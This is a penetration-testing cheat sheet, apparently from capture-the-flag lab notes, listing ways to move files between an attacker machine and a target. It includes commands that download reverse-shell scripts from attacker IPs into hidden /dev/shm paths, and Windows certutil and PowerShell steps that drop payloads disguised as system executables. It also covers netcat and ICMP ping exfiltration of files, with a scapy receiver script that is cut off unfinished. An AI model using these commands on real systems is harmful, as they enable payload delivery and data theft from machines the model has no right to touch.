# Servers

## Http
* `python3 -m http.server 8000`
* * `wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py`
* * `wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm`
* * `curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py`
* * `fetch 10.10.14.14:8000/shell.py` #FreeBSD
* * visit IP in browser
* * (windows) `certutil.exe -urlcache -split -f "http://10.99.254.156/msdtl-Service.exe" c:\windows\system32\msdtl.exe`
* * `bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf`
* * (windows PS) `(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")`
* * `Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"`
* * `wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"`

# Apache2
Steps:
1. sudo apt-get install apache2
2. Add "ServerName niigata.energy.japan" to first line of /etc/apache2/apache2.conf
3. sudo a2enmod ssl
4. service apache2 restart
5. echo "Required content for japan" > /var/www/html/test.html
6. sudo a2ensite default-ssl
7. systemctl reload apache2
8. openssl genrsa -out /etc/ssl/private/japan.key 2048
9. vi /etc/apache2/sites-available/default-ssl.conf, change document root for port 443 to /var/www/https and create that folder and files 
vi /etc/apache2/sites-available/default-ssl.conf
<Directory /var/www/https/protected>
    AuthType Basic
    AuthName "generic name"
    AuthUserFile /etc/apache2/passwd
    Require valid-user
</Directory>

htpasswd -B /etc/apache2/passwd <user>



# FTP 

* `pip3 install pyftpdlib`
* `python3 -m pyftpdlib -p 21`
* * (windows) `ftp`->`to`-><IP>->`anonymous`->`anonymous`
* * (linux) `ftp <ip> 21`->`anonymous`->`anonymous`
## commands
* put,get,ls,dir,quit
* ----------------------------------
* apt install vsftpd
* config -> /etc/vsftp.conf

# SCP

`scp <username>@<Attacker_IP>:<directory>/<filename>`

## SMB
* "impacket-smbserver -smb2support sharedfolder `pwd`"  || `python /usr/share/doc/python-impacket/examples/smbserver.py sharedfolder .`
* * (windows) `copy \\IP\sharedfolder\file .`
* * (linux) `smbget -R smb://$IP/sharedfolder`
* * `smbclient //$IP/sharedfolder -U anonymous`

### Samba on Linux
* apt-get install samba
* mkdir /tmp/smb
* chmod 777 /tmp/smb
* #Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
* service smbd restart

# NC
* nc -lvnp 4444 > new_file
* nc -vn <IP> 4444 < exfil_file

# ICMP

#In order to exfiltrate the content of a file via pings you can do:
`xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done`
#This will 4bytes per ping packet (you could probably increase this until 16)
## receiver
```
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")
sniff(iface="tun0", prn=process_packet
```